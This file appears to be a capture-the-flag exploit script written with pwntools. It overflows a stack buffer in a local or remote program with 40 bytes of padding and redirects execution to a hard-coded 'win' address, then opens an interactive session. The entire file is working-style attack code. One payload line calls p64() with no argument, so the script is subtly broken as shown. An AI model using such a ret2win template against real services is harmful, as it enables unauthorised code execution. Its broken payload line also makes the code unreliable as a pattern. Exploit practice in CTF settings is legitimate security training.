import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
win_addr = 0x400861
    
    ###main###
def main():
    ###payload###
    payload = b"A" * 40
    payload += p64()
    payload += p64(win_addr)
    
    _ = target.recvuntil("Input: ")
    target.sendline(payload)
    ret = target.recv(2048)
    
    target.interactive()

    
if __name__ == "__main__":
    main()
